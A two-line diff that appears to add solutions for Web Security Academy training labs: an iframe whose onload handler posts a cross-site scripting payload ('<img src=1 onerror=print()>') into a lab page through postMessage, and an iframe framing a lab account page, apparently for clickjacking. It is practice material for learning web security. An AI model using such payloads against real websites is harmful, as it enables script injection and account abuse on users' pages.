@@ -1,0 +1,2 @@
+<iframe src="https://LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
